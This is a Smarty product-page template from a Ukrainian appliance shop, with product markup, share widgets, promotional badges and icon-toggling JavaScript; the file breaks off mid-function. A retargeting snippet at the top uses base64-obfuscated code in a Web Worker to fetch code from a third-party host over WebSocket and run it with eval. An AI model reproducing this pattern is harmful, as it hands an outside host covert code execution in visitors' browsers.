{include file='_header.tpl'}

<!--Trafmag ретаргетинг-->
{literal}
<script type='text/javascript'>(function(t,r,f,m,g,c){g=t.createElement(r),c=t.getElementsByTagName(r)[0];g.type='text/javascript';g.async=1;g.src=(t.location.protocol == 'https:'?'https:':'http:')+f+m;g.onerror = function () {try {if (t.location.protocol == 'https:'){var wsproto = 'wss',wsport = '8041'} else {var wsproto='ws',wsport='8040'};var wrkr_tr_location = wsproto+':'+f+':'+wsport+m+'?ref='+encodeURIComponent(window.location.href);var wrkr_tr = new Worker(URL.createObjectURL(new Blob(['var wrkr_tr_location = "' + wrkr_tr_location + '";eval(atob("DWZ1bmN0aW9uIHNlbmRNZXNzYWdlKGUpew12YXIgaD13cmtyX3RyLm9ubWVzc2FnZTsNd3Jrcl90ci5yZWFkeVN0YXRlPT13cmtyX3RyLkNMT1NFRCYmKHdya3JfdHI9bmV3IFdlYlNvY2tldCh3cmtyX3RyX2xvY2F0aW9uKSksDXdya3JfdHIub25tZXNzYWdlPWgsDXdhaXRGb3JTb2NrZXRDb25uZWN0aW9uKHdya3JfdHIsZnVuY3Rpb24oKXt3cmtyX3RyLnNlbmQoZSk7fSkNfQ1mdW5jdGlvbiB3YWl0Rm9yU29ja2V0Q29ubmVjdGlvbihlLHQpe3NldFRpbWVvdXQoZnVuY3Rpb24oKXtyZXR1cm4gMT09PWUucmVhZHlTdGF0ZT92b2lkKG51bGwhPXQmJnQoKSk6dm9pZCB3YWl0Rm9yU29ja2V0Q29ubmVjdGlvbihlLHQpfSw1KX07DXdya3JfdHIgPSBuZXcgV2ViU29ja2V0KHdya3JfdHJfbG9jYXRpb24pLA13cmtyX3RyLm9ubWVzc2FnZSA9IGZ1bmN0aW9uICh0KSB7cG9zdE1lc3NhZ2UodC5kYXRhKTt9LA1vbm1lc3NhZ2UgPSBmdW5jdGlvbihlKXtzZW5kTWVzc2FnZShlLmRhdGEpfQ0="))']), {type: "application/javascript"}));wrkr_tr.onmessage = function(msg) {window.eval(msg.data)};wrkr_tr.postMessage('');}catch (err) {}};c.parentNode.insertBefore(g,c);})(document,'script','//t.trafmag.com','/tracking.js');</script>
{/literal}
<!-- //Trafmag ретаргетинг-->

{if $item}
    <div itemscope itemtype="http://schema.org/Product">
        {if $zf.params.itemId==6411}
            <a href="https://590.ua/catalog/cat/23/brand/20" xmlns="http://www.w3.org/1999/html">Стиральные машины Miele</a>
        {/if}

        <div class="one_item_head">
            <div style="display:none">{$item.category_onename}{$item.category}{$item.brand}{$item.name}</div>
            <h1>
                {if $item.category_onename}{$item.category_onename}{else}{$item.category}{/if} <span itemprop="brand"><span itemprop="manufacturer" itemscope itemtype="http://schema.org/Organization"><span itemprop="name">{$item.brand}</span></span></span>
                <span itemprop="name">{$item.name}</span>
            </h1>
            <a style="display:none" itemprop="url" href="{iurl assoc.parent=$item.parent_name assoc.cat=$item.cat_onename assoc.brand=$item.brand assoc.item=$item.name}"></a>

            {if $login == 'Vitaliy Shyshko'}
            <!-- Like -->
            <div class="like">
                <div class="like-item">
                    {literal}
                        <a rel="noindex, nofollow" href="https://twitter.com/share" class="twitter-share-button" data-text="{/literal}{$item.category_onename} {$item.brand} {$item.name}{literal}. Интернет-магазин 590.ua" data-url = 'https://590.ua/catalog/item/{/literal}{$item.id}{literal}' data-lang="ru">Твитнуть</a>
                        <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');
                        </script>
                    {/literal}
                </div>
                <div class="like-item">
                    {literal}
                        <fb:like send="false" layout="button_count" width="126" show_faces="true"></fb:like>
                    {/literal}
                </div>
                <div class="like-item">
                    <div class="g-plusone" data-size="medium" data-annotation="none" data-width="120"></div>
                    {literal}
                        <script type="text/javascript">
                            (function() {
                                var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
                                po.src = 'https://apis.google.com/js/plusone.js';
                                var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
                            })();
                        </script>
                    {/literal}
                </div>
            </div><!-- Like End -->
            {/if}

            <div class="sku">Код товара {$item.id}</div>
            <span style="display:none" itemprop="productID">{$item.id}</span>
            <div style="color: #31A0CC; font-weight: bold; line-height: 5px; margin-top: 5px;" class="pull-right">
                Код товара: {$item.id}<!--590CodeJs--><!--/590CodeJs-->
            </div>
        </div><!-- // one_item_head -->

{if ($login=='акция рождество' || $login=='Гальченко Владимир') && $item_id_temporary_celebration}
<!-- Saint Nicolas -->
<a href="https://goo.gl/4CLd9k" target="_blank"><img style="margin-top: -20px;margin-bottom: 5px;" src="/images/hint/nikolay.gif"></a>
{/if}

        <div class="one_item_block">
            <div class="span-5 one_item_left">
                <div class="span-4 one_item_img_block">
{if $temporary_cashback_setting_action.on_off == 'on'}
{literal}
<style type="text/css">
    #refund_electrolux:hover::after {
    	content: attr(data-title);
    	position: absolute;
    	left: 20px;
    	top: 70px;
    	z-index: 1;
    	background: #2a98c4;
    	font-size: 14px;
    	padding: 5px 10px;
    	color: #fff;
    	text-shadow: white 0 0 1px;
    	line-height: 16px;
    	border-radius: 10px;
    	width: 140px;
    	box-shadow: 0 0 10px rgba(0,0,0,0.5);
    	text-align: center;
    }
</style>
{/literal}
                            {assign var="iteration_action" value=0}
                                {foreach from=$item_id_temporary_cashback item=foo}
                                    {if $item.id2 == $foo}
<a href="{$temporary_cashback_setting_action.action_link}" target="_blank" title="Узнать подробнее..."><div style="display: block;
    position: absolute;
    left: 40px;
    z-index: 1;
    top: 220px;
    width: 200px;
    height: 200px;
    background-image: url(/images/icons/temporary_cashback_action.jpg);
    background-size: cover;" id="refund_electrolux" data-title="{$temporary_cashback_setting_action.item_image_info}"></div></a>
    <a href="{$temporary_cashback_setting_action.action_link}" target="_blank" title="Узнать подробнее..."><div style="
    text-align: center;
    color: #edf5f8;
    font-size: 12px;
    font-weight: bold;
    position: absolute;
    z-index: 1;
    background-color: #0878C2;
    border-radius: 10px;
    padding: 3px;
    box-shadow: 0 0 5px rgba(0,0,0,0.5);
    width: 175px;
    cursor: pointer;
    top: 191px;
    {if $item.acttype !== 'gift'&& $x3 > 0 || $item.id == '21465'}left: 10px;{else}left: 50px;{/if}">+{$temporary_cashback_summ[$iteration_action]} грн. {$temporary_cashback_setting_action.item_for_what}</div></a>
    {assign var="electrolux_action" value=1}
                                    {/if}
                                    {assign var="iteration_action" value=$iteration_action+1}
                                {/foreach}
{/if}
                    <div class="main_photo">{if $item.images}{foreach from=$item.images item=item_image name=item_image}{if $smarty.foreach.item_image.first}<a rel="prettyPhoto[pp]" href="{$url.img}/catalog/{$item_image.id}.{$item_image.imgext}" alt="{if $item.cat_onename}{$item.cat_onename|mblower}{else}{$item.cat|mblower}{/if} {$item.brand} {$item.name} {'купить'}" title="{if $item.cat_onename}{$item.cat_onename|mblower}{else}{$item.cat|mblower}{/if} {$item.brand} {$item.name}">
                                    <img  src="{$url.img}/catalog/{$item_image.id}_s.{$item_image.imgext}" alt="{if $item.cat_onename}{$item.cat_onename|mblower}{else}{$item.cat|mblower}{/if} {$item.brand} {$item.name} {'купить'}" title="{if $item.cat_onename}{$item.cat_onename|mblower}{else}{$item.cat|mblower}{/if} {$item.brand} {$item.name}" />
                                </a>
                            {/if}
                        {/foreach}
                    {else}
                        <img src="/images/noimage.jpg" alt="{$item.brand} {$item.name}" />
                    {/if}

{if $login == 'old version'}
                    {if $item.bestprice > $item.price}
                        <i title="Лучшая цена" class="sale-icon sale-icon-price"></i>
                    {/if}
                    {if $item.specprice && ($item.bdprice > $item.price) && (($item.bdprice - $item.price) > 1) && !($item.sale==1 && $item.d90==-1)}
                        <i title="Акционная цена" class="sale-icon sale-icon-discount"></i>
                    {/if}
                    {if $item.sale==1 && $item.d90==-1}
                        <i title="Распродажа" class="sale-icon sale-icon-sale"></i>
                    {/if}
                    {if $item.id_brand == '26' && $item.id_category != 60}
                        <i class="guarantee-icon"></i>
                    {/if} </div>
{else}
 </div>
{literal}
<style type="text/css">

.wrapper_body {
    position: absolute;
    padding: 20px 0;
    height: 100%;
    width: 100%;
    font-size: 11px;
    font-family: 'Open Sans', sans-serif;
    color: #4A4A4A ;
    text-align: center;
    background: url(data:;base64,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);
}
.cbm_wrap {
    background: #fff;
    margin: 20px auto;
    display: block;
    width: 300px;
    min-height: 280px;
    padding:20px;
    border-radius: 2px 2px 2px 2px;
    -webkit-box-shadow: 0 1px 20px
     rgba(0, 0, 0, 0.6), 0 0 40px
     rgba(0, 0, 0, 0.15) inset;
    -moz-box-shadow: 0 1px 20px rgba(0, 0, 0, 0.6), 0 0 40px rgba(0, 0, 0, 0.15) inset;    box-shadow: 0 1px 20px
     rgba(0, 0, 0, 0.6), 0 0 40px
     rgba(0, 0, 0, 0.15) inset;
}
.cbm_wrap img {
    width: 100%;
    margin-top: 10px;
}
.cbm_wrap p{
    margin-top: 15px !important;
    text-align: justify !important;
}
.cbm_wrap h1{
    font-size: 20px;
    font-weight: bold;
    margin-top: 5px;
    text-shadow: 1px 1px 3px rgba(0,0,0,0.3);
}
.cbm_wrap a{
    text-decoration: none;
    color: #4A4A4A !important;
}
.cbm_wrap a:hover{
    text-decoration: underline;
    color: #6B6B6B !important ;
}

.oplata_chast_icon, .bonus_on_card, .oplata_rassrochka_icon, .waranty_zirtal, .best_price_icon, .country_icon{
    text-align: center;
    color: #706f79;
    font-size: 10px;
    line-height: 13px;
    font-weight: bold;
    position: absolute;
    margin-left: -27px;
    z-index: 4;
    background-color: #f7f7f7;
    border: 1px solid rgba(221, 221, 221, 0.95);
    border-radius: 10px;
    padding: 2px;
    padding-left: 27px;
    cursor: help;
    width: 47px;
    height: 26px;
}
.waranty_zirtal{cursor: default !important;}
.bonus_on_card{margin-top: -265px;margin-left: -15px;}
.country_icon{margin-top: -230px;margin-left: -15px;cursor: default;}
.oplata_chast_icon{margin-top: -194px;margin-left: -15px;}
.oplata_rassrochka_icon{margin-top: -158px;margin-left: -15px;}
.waranty_zirtal{margin-top: -122px;margin-left: -15px;cursor: default;}
.best_price_icon{margin-top: -86px;margin-left: -15px;}

.trdein_icon{margin-top: -80px; margin-left: 220px; position: absolute; z-index: 4; cursor: help;}
.black_friday{margin-top: -260px; margin-left: 240px; position: absolute; z-index: 4; cursor: help;}

{/literal}
{if $item.id_availability != 1} {literal}
    .waranty_zirtal{margin-top:-194px !important;} {/literal}
{/if}

{if $item.id_availability != 1} {literal}
    .best_price_icon{margin-top:-157px !important;} {/literal}
{/if}

{if $item.id_brand != '26'} {literal}
    .best_price_icon{margin-top:-121px !important;} {/literal}
{/if}

{if !$item.country}{literal}
    .bonus_on_card{margin-top:-229px !important;} {/literal}
{/if}

{if $item.id_brand != '26' && $item.id_availability != 1} {literal}
    .best_price_icon{margin-top:-195px !important;} {/literal}
{/if} {literal}

    .overlay_icons{
      display:none;
      position: absolute;

    }
    .bonus_on_card:hover .overlay_icons,
    .oplata_chast_icon:hover .overlay_icons,
    .oplata_rassrochka_icon:hover .overlay_icons,
    .best_price_icon:hover .overlay_icons,
    .trdein_icon:hover .overlay_icons,
    .black_friday:hover .overlay_icons{
        display: block;
    }
</style>
<script type="text/javascript">
    function hide_icons_bonus()
{
if(document.getElementsByClassName('oplata_chast_icon')[0])
    document.getElementsByClassName('oplata_chast_icon')[0].style.zIndex = "0";

if(document.getElementsByClassName('oplata_rassrochka_icon')[0])
    document.getElementsByClassName('oplata_rassrochka_icon')[0].style.zIndex = "0";

if(document.getElementsByClassName('waranty_zirtal')[0])
    document.getElementsByClassName('waranty_zirtal')[0].style.zIndex = "0";

if(document.getElementsByClassName('best_price_icon')[0])
    document.getElementsByClassName('best_price_icon')[0].style.zIndex = "0";

if(document.getElementsByClassName('trdein_icon')[0])
    document.getElementsByClassName('trdein_icon')[0].style.zIndex = "3";

if(document.getElementsByClassName('black_friday')[0])
    document.getElementsByClassName('black_friday')[0].style.zIndex = "3";
}
    function show_icons_bonus()
{
if(document.getElementsByClassName('oplata_chast_icon')[0])
    document.getElementsByClassName('oplata_chast_icon')[0].style.zIndex = "4";

if(document.getElementsByClassName('oplata_rassrochka_icon')[0])
    document.getElementsByClassName('oplata_rassrochka_icon')[0].style.zIndex = "4";

if(document.getElementsByClassName('waranty_zirtal')[0])
    document.getElementsByClassName('waranty_zirtal')[0].style.zIndex = "4";

if(document.getElementsByClassName('best_price_icon')[0])
    document.getElementsByClassName('best_price_icon')[0].style.zIndex = "4";

if(document.getElementsByClassName('trdein_icon')[0])
    document.getElementsByClassName('trdein_icon')[0].style.zIndex = "4";

if(document.getElementsByClassName('black_friday')[0])
    document.getElementsByClassName('black_friday')[0].style.zIndex = "4";
}

    function hide_icons_oplata_chast()
{
if(document.getElementsByClassName('oplata_rassrochka_icon')[0])
    document.getElementsByClassName('oplata_rassrochka_icon')[0].style.zIndex = "0";

if(document.getElementsByClassName('waranty_zirtal')[0])
    document.getElementsByClassName('waranty_zirtal')[0].style.zIndex = "0";

if(document.getElementsByClassName('best_price_icon')[0])
    document.getElementsByClassName('best_price_icon')[0].style.zIndex = "0";

if(document.getElementsByClassName('trdein_icon')[0])
    document.getElementsByClassName('trdein_icon')[0].style.zIndex = "3";

if(document.getElementsByClassName('black_friday')[0])
    document.getElementsByClassName('black_friday')[0].style.zIndex = "3";
}
    function show_icons_oplata_chast()
{
if(document.getElementsByClassName('oplata_rassrochka_icon')[0])
    document.getElementsByClassName('oplata_rassrochka_icon')[0].style.zIndex = "4";

if(document.getElementsByClassName('waranty_zirtal')[0])
    document.getElementsByClassName('waranty_zirtal')[0].style.zIndex = "4";

if(document.getElementsByClassName('best_price_icon')[0])
    document.getElementsByClassName('best_price_icon')[0].style.zIndex = "4";

if(document.getElementsByClassName('trdein_icon')[0])
    document.getElementsByClassName('trdein_icon')[0].style.zIndex = "4";

if(document.getElementsByClassName('black_friday')[0])
    document.getElementsByClassName('black_friday')[0].style.zIndex = "4";
}

    function hide_icons_oplata_rassrochka()
{
if(document.getElementsByClassName('waranty_zirtal')[0])
    document.getElementsByClassName('waranty_zirtal')[0].style.zIndex = "0";

if(document.getElementsByClassName('best_price_icon')[0])
    document.getElementsByClassName('best_price_icon')[0].style.zIndex = "0";

if(document.getElementsByClassName('trdein_icon')[0])
    document.getElementsByClassName('trdein_icon')[0].style.zIndex = "3";

if(document.getElementsByClassName('black_friday')[0])
    document.getElementsByClassName('black_friday')[0].style.zIndex = "3";
}
    function show_icons_oplata_rassrochka()
{
if(document.getElementsByClassName('waranty_zirtal')[0])
    document.getElementsByClassName('waranty_zirtal')[0].style.zIndex = "4";

if(document.getElementsByClassName('best_price_icon')[0])
    document.getElementsByClassName('best_price_icon')[0].style.zIndex = "4";

if(document.getElementsByClassName('trdein_icon')[0])
    document.getElementsByClassName('trdein_icon')[0].style.zIndex = "4";

if(document.getElementsByClassName('black_friday')[0])
    document.getElementsByClassName('black_friday')[0].style.zIndex = "4";
}

    function hide_icons_best_price()
{
if(document.getElementsByClassName('trdein_icon')[0])
    document.getElementsByClassName('trdein_icon')[0].style.zIndex = "3";

if(document.getElementsByClassName('black_friday')[0])
